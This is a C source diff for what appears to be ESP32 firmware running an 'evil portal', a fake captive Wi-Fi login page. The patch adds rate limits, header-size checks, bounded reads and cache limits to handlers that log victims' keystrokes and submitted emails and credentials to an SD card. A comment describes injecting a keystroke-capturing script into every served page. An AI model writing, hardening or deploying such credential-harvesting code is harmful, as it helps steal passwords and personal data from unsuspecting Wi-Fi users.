@@ -189,6 +189,12 @@ EXT_RAM_BSS_ATTR static char current_keystrokes_filename[128] = "";
 static int ap_connection_count = 0;
 
 #define MAX_HTML_BUFFER_SIZE 2048
+#define PORTAL_MAX_FILE_CACHE_SIZE (512 * 1024)
+#define PORTAL_MAX_LOG_BODY_SIZE 256
+#define PORTAL_LOG_WINDOW_US (1000 * 1000)
+#define PORTAL_LOG_REQUESTS_PER_WINDOW 16
+#define PORTAL_MIN_FLUSH_INTERVAL_US (5 * 1000 * 1000)
+#define PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE 256
 
 // JavaScript snippet injected into every served HTML page to capture keystrokes and input values
 // Keep as const array so it lives in flash (.rodata) and not in RAM
@@ -221,6 +227,39 @@ EXT_RAM_BSS_ATTR static char s_portal_keystroke_buf[PORTAL_KEYSTROKE_BUF_SZ];
 static size_t s_portal_keystroke_len = 0;
 EXT_RAM_BSS_ATTR static char s_portal_creds_buf[PORTAL_CREDS_BUF_SZ];
 static size_t s_portal_creds_len = 0;
+static int64_t s_portal_log_window_started_us = 0;
+static unsigned int s_portal_log_requests_in_window = 0;
+static int64_t s_portal_last_flush_us = 0;
+
+static void portal_flush_buffers_to_sd(void);
+
+static bool portal_capture_request_allowed(void) {
+    const int64_t now = esp_timer_get_time();
+
+    if (s_portal_log_window_started_us == 0 ||
+        now - s_portal_log_window_started_us >= PORTAL_LOG_WINDOW_US) {
+        s_portal_log_window_started_us = now;
+        s_portal_log_requests_in_window = 0;
+    }
+
+    if (s_portal_log_requests_in_window >= PORTAL_LOG_REQUESTS_PER_WINDOW) {
+        return false;
+    }
+
+    s_portal_log_requests_in_window++;
+    return true;
+}
+
+static void portal_flush_buffers_if_due(void) {
+    const int64_t now = esp_timer_get_time();
+    if (s_portal_last_flush_us != 0 &&
+        now - s_portal_last_flush_us < PORTAL_MIN_FLUSH_INTERVAL_US) {
+        return;
+    }
+
+    s_portal_last_flush_us = now;
+    portal_flush_buffers_to_sd();
+}
 
 static void portal_flush_buffers_to_sd(void) {
 #if defined(CONFIG_BUILD_CONFIG_TEMPLATE)
@@ -1080,20 +1119,24 @@ const char *get_content_type(const char *uri) {
 }
 
 char *get_host_from_req(httpd_req_t *req) {
-    size_t buf_len = httpd_req_get_hdr_value_len(req, "Host") + 1;
-    if (buf_len > 1) {
-        char *host = malloc(buf_len);
+    size_t host_len = httpd_req_get_hdr_value_len(req, "Host");
+    if (host_len > 0 && host_len <= PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
+        char *host = malloc(host_len + 1);
         if (!host) {
             httpd_resp_send_500(req);
             return NULL;
         }
-        if (httpd_req_get_hdr_value_str(req, "Host", host, buf_len) == ESP_OK) {
+        if (httpd_req_get_hdr_value_str(req, "Host", host, host_len + 1) == ESP_OK) {
             printf("Host header found: %s\n", host);
             return host; // Caller must free() this memory
         }
         free(host);
     }
-    printf("Host header not found\n");
+    if (host_len > PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
+        ESP_LOGW(TAG, "Ignoring oversized Host header (%zu bytes)", host_len);
+    } else {
+        printf("Host header not found\n");
+    }
     return NULL;
 }
 
@@ -1237,41 +1280,60 @@ esp_err_t portal_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 esp_err_t get_log_handler(httpd_req_t *req) {
-    char body[256] = {0};
-    int received = 0;
+    if (req->content_len <= 0 || req->content_len > PORTAL_MAX_LOG_BODY_SIZE) {
+        httpd_resp_set_hdr(req, "Connection", "close");
+        httpd_resp_set_status(req, "413 Payload Too Large");
+        httpd_resp_send(req, "Portal log payload too large", HTTPD_RESP_USE_STRLEN);
+        return ESP_FAIL;
+    }
+
+    if (!portal_capture_request_allowed()) {
+        httpd_resp_set_hdr(req, "Connection", "close");
+        httpd_resp_set_status(req, "429 Too Many Requests");
+        httpd_resp_send(req, "Portal log rate limit exceeded", HTTPD_RESP_USE_STRLEN);
+        return ESP_FAIL;
+    }
+
+    char body[PORTAL_MAX_LOG_BODY_SIZE + 1];
+    size_t received_total = 0;
 
     bool require_jit = false;
 #ifdef CONFIG_BUILD_CONFIG_TEMPLATE
     require_jit = (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") == 0);
 #endif
 
-    while ((received = httpd_req_recv(req, body, sizeof(body) - 1)) > 0) {
-        body[received] = '\0';
-
-        if (current_keystrokes_filename[0] != '\0') {
-            if (!require_jit) {
-                if (sd_card_manager.is_initialized) {
-                    FILE *f = fopen(current_keystrokes_filename, "a");
-                    if (f) { 
-                        fprintf(f, "%s", body); 
-                        fclose(f); 
-                    }
-                }
-            } else {
-                size_t chunk = strlen(body);
-                if (s_portal_keystroke_len + chunk >= PORTAL_KEYSTROKE_BUF_SZ) {
-                    portal_flush_buffers_to_sd();
-                    chunk = strlen(body);
-                }
-                size_t avail = PORTAL_KEYSTROKE_BUF_SZ - s_portal_keystroke_len;
-                if (chunk > avail) chunk = avail;
-                memcpy(s_portal_keystroke_buf + s_portal_keystroke_len, body, chunk);
-                s_portal_keystroke_len += chunk;
+    while (received_total < (size_t)req->content_len) {
+        int received = httpd_req_recv(req, body + received_total,
+                                     (size_t)req->content_len - received_total);
+        if (received <= 0) {
+            if (received == HTTPD_SOCK_ERR_TIMEOUT) {
+                httpd_resp_send_408(req);
             }
+            return ESP_FAIL;
         }
+        received_total += (size_t)received;
     }
 
-    if (received < 0) return ESP_FAIL;
+    if (current_keystrokes_filename[0] != '\0') {
+        if (!require_jit) {
+            if (sd_card_manager.is_initialized) {
+                FILE *f = fopen(current_keystrokes_filename, "a");
+                if (f) {
+                    fwrite(body, 1, received_total, f);
+                    fclose(f);
+                }
+            }
+        } else {
+            size_t chunk = received_total;
+            if (s_portal_keystroke_len + chunk >= PORTAL_KEYSTROKE_BUF_SZ) {
+                portal_flush_buffers_if_due();
+            }
+            size_t avail = PORTAL_KEYSTROKE_BUF_SZ - s_portal_keystroke_len;
+            if (chunk > avail) chunk = avail;
+            memcpy(s_portal_keystroke_buf + s_portal_keystroke_len, body, chunk);
+            s_portal_keystroke_len += chunk;
+        }
+    }
 
     httpd_resp_send(req, "Body content logged successfully", 30);
     return ESP_OK;
@@ -1286,6 +1348,13 @@ esp_err_t get_info_handler(httpd_req_t *req) {
 #ifdef CONFIG_BUILD_CONFIG_TEMPLATE
     require_jit = (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") == 0);
 #endif
+
+    if (!portal_capture_request_allowed()) {
+        httpd_resp_set_hdr(req, "Connection", "close");
+        httpd_resp_set_status(req, "429 Too Many Requests");
+        httpd_resp_send(req, "Portal capture rate limit exceeded", HTTPD_RESP_USE_STRLEN);
+        return ESP_FAIL;
+    }
 
     if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
         char email_val[64] = {0};
@@ -1314,10 +1383,10 @@ esp_err_t get_info_handler(httpd_req_t *req) {
                 } else {
                     size_t cp = (size_t)n;
                     if (s_portal_creds_len + cp > PORTAL_CREDS_BUF_SZ) {
-                        portal_flush_buffers_to_sd();
-                        cp = (size_t)n;
-                        if (cp > PORTAL_CREDS_BUF_SZ) cp = PORTAL_CREDS_BUF_SZ;
+                        portal_flush_buffers_if_due();
                     }
+                    size_t avail = PORTAL_CREDS_BUF_SZ - s_portal_creds_len;
+                    if (cp > avail) cp = avail;
                     memcpy(s_portal_creds_buf + s_portal_creds_len, line, cp);
                     s_portal_creds_len += cp;
                 }
@@ -1346,15 +1415,17 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     } else {
         ESP_LOGI(TAG, "Redirect handler: Host header not present");
     }
-    size_t ua_len = httpd_req_get_hdr_value_len(req, "User-Agent") + 1;
-    if (ua_len > 1) {
-        char *ua = malloc(ua_len);
+    size_t ua_len = httpd_req_get_hdr_value_len(req, "User-Agent");
+    if (ua_len > 0 && ua_len <= PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
+        char *ua = malloc(ua_len + 1);
         if (ua) {
-            if (httpd_req_get_hdr_value_str(req, "User-Agent", ua, ua_len) == ESP_OK) {
+            if (httpd_req_get_hdr_value_str(req, "User-Agent", ua, ua_len + 1) == ESP_OK) {
                 ESP_LOGI(TAG, "Redirect handler User-Agent: %s", ua);
             }
             free(ua);
         }
+    } else if (ua_len > PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
+        ESP_LOGW(TAG, "Ignoring oversized User-Agent header (%zu bytes)", ua_len);
     }
     if (login_done) {
         httpd_resp_set_hdr(req, "Cache-Control", "no-store");
@@ -1382,7 +1453,8 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     }
     // minimal logging for captive probe
 
-    if (strstr(req->uri, "/get") != NULL) {
+    if (strncmp(req->uri, "/get", 4) == 0 &&
+        (req->uri[4] == '\0' || req->uri[4] == '?')) {
         get_info_handler(req);
         return ESP_OK;
     }
@@ -1617,6 +1689,9 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
     current_keystrokes_filename[0] = '\0';
     s_portal_keystroke_len = 0;
     s_portal_creds_len = 0;
+    s_portal_log_window_started_us = 0;
+    s_portal_log_requests_in_window = 0;
+    s_portal_last_flush_us = 0;
     portal_sd_jit_mounted = false;
     portal_display_suspended = false;
     // jit mount sd for somethingsomething template only
@@ -1682,7 +1757,7 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
                 fseek(pf, 0, SEEK_END);
                 long pf_size = ftell(pf);
                 rewind(pf);
-                if (pf_size > 0) {
+                if (pf_size > 0 && pf_size <= PORTAL_MAX_FILE_CACHE_SIZE) {
                     char *pf_buf = NULL;
 #if CONFIG_SPIRAM
                     pf_buf = (char*)heap_caps_malloc((size_t)pf_size + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
@@ -1695,16 +1770,23 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
 #endif
                     if (pf_buf != NULL) {
                         size_t pf_read = fread(pf_buf, 1, (size_t)pf_size, pf);
-                        pf_buf[pf_read] = '\0';
-                        portal_file_cache      = pf_buf;
-                        portal_file_cache_size = pf_read;
-                        ESP_LOGI(TAG, "Portal file pre-loaded into cache: %zu bytes from %s",
-                                 pf_read, URLorFilePath);
+                        if (pf_read == (size_t)pf_size) {
+                            pf_buf[pf_read] = '\0';
+                            portal_file_cache      = pf_buf;
+                            portal_file_cache_size = pf_read;
+                            ESP_LOGI(TAG, "Portal file pre-loaded into cache: %zu bytes from %s",
+                                     pf_read, URLorFilePath);
+                        } else {
+                            ESP_LOGW(TAG, "Portal file cache: incomplete read (%zu/%ld bytes) from %s",
+                                     pf_read, pf_size, URLorFilePath);
+                            free(pf_buf);
+                        }
                     } else {
                         ESP_LOGW(TAG, "Portal file cache: malloc failed for %ld bytes", pf_size);
                     }
                 } else {
-                    ESP_LOGW(TAG, "Portal file cache: fseek/ftell returned %ld for %s", pf_size, URLorFilePath);
+                    ESP_LOGW(TAG, "Portal file cache: refusing %ld-byte file from %s (limit %u bytes)",
+                             pf_size, URLorFilePath, (unsigned)PORTAL_MAX_FILE_CACHE_SIZE);
                 }
                 fclose(pf);
             } else {
